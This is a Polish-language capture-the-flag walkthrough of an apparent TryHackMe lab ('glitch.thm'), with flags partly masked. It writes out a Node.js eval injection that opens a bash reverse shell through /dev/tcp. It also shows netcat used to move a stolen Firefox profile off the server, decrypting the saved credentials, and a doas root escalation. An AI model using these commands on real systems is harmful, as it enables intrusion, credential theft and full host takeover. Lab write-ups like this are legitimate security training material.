1) Poczekaj okolo 5 min, az `blad 502` zniknie i strona sie zaladuje.

2) Otworz `narzedzia developerskie` i otworz `tag script`.

3) Z ponizszego kodu:

```

      function getAccess() {
        fetch('/api/ac**ss')        <---------------------
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    
```

Wyciagamy endpoint do pierwszego api. 

4) Doklejamy do linku `/api/ac**ss` i ukazuje nam sie zakodowany `token`:

```dGhpc****3RfcmVhbA==```

5) Mozna od razu zauwazyc ze ciag wyglada znajomo jest to `base64`.

Wchodzimy na np. te strone: [base64_decode](base64decode.org/)

Wpisujemy nasz `zakodowany token` i dostajemy `odkodowany`:

```this_is_*_**```

6) Wracamy na `glowna strone` wchodzimy w `narzedzia developerskie`.

Wchodzimy w zakladke `Cookies` i widzimy `token` ustawiony na wartosc `value` klikamy dwukrotnie na niego i zmieniamy wartosc na nasz `odkowany token`.

Po tym wszystkim `odswiezamy strone` (f5)

7) Ukazuje nam sie inna strona wchodzimy w zakladke `debugger`. 

Na lewym panelu rozwijamy zakladke `js` i klikamy w plik `script.js`

```
  const container = document.getElementById('items');
  await fetch('/api/**')                                <------------------------
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {

```

Z powyzszego kodu widzimy kolejny endpoint do `nastepnego API`.

8) Dopisujemy go do naszego `linku` i przechwytujemy `request` przez np. w moim przykladu program `burp`.

9) Robimy `send to reapeater` i robimy `send`.

Jesli sie nie powiedzie `usun` z `requestu Header`:

```
    If-None-Match: W/"a9-0aR6bAfiK/DB+***"

```

I powinno juz wszystko dzialac. 

10) Sprawdzamy na jakie zapytania `pozwala` API. 

Zmieniamy `GET` na `OPTIONS`

```OPTIONS /api/i* HTTP/1.1```

11) Widzimy ze mozemy wykonac nastepujace rzeczy w tym endpoitcie:

```GET,HEAD,POST```

12) Sprawdzamy mozliwe parametry:

```wfuzz -c -z file,/usr/share/wordlists/common.txt -X POST --hh 45 -u http://<IP>/api/i*\?FUZZ\=test```

Widzimy funkcje `eval`, ktora powinna nam dac duzo do myslenia:

```
    ReferenceError: test is not defined
    at eval (eval at router.post (/var/web/routes/api.js:25:60
```

13) Interesuje nas `POST`. Szukamy w internecie `NodeJs RCE eval`. 

Ja skorzystalem z tej strony: [strona](https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6)

Zauwazylem tam `exploit` ktory uzyje.

14) Zmieniamy w `burpie` parametr na `post` i dopisujemy `?cmd=` oraz doklejamy `exploit`:

```
    POST /api/i*?cmd=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/<IP>/<PORT>+0>%261"') HTTP/1.1
```

W terminalu wpisujemy `nc -lvpn <PORT>`

I klikamy `send`. Powinnismy uzyskac dostep do uzytkownika `user`.

15) Wchodzimy do katalogu `/home/user` i widzimy `pierwsza flage`.

16) Po przepisaniu flagi (`cat <plik>`) pokazujemy wszystkie pliki w folderze `ls -la`.

Moze nam sie rzucic w oczy ukryty katalog `.firefox`. Wchodzimy w niego `cd .firefox`.

Widzimy cos co wyglada jak katolog sesji `b5w4643p.default-release`.

17) Na nasza maszyne pobieramy: [Firefox_decrypt](https://github.com/unode/firefox_decrypt)

Pakujemy sesje z servera `tar -cf archive.tar ./b* `.

Za pomoca [netcata](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/) wysylamy plik na nasz komputer.

Na naszym komputerze wpisujemy: `nc -l -p 1234 > ./archive.tar`.

A na serverze: `nc -w 3 <IP> 1234 < archive.tar`.

18) Potem za pomoca `firefox_decrypt` deszyfrujemy haslo do uzytkownika `v0id`:

```./firefox_decrypt.py ./(SCIEZKA DO KATALOGU)b5w4643p.default-release```


Po chwili ukazuje nam sie:

```

    Website:   https://glitch.thm
    Username: 'v0id'
    Password: 'love_*'


```

19) Przechodzimy na uzytkownika `v0id` za pomoca `su v0id`.

Jesli pokaze Ci sie: `su: must be run from a terminal `. Wpisz: `python3 -c 'import pty; pty.spawn("/bin/bash")'`. A potem ponownie probujemy.

20) Za pomoca polecenia `doas` zwiekszamy nasze uprawnienia do uzytkownika `root`.

```doas -u root /bin/bash```

21) Wchodzimy do katalogu `/root` i zdobywamy `ostatnia flage`.
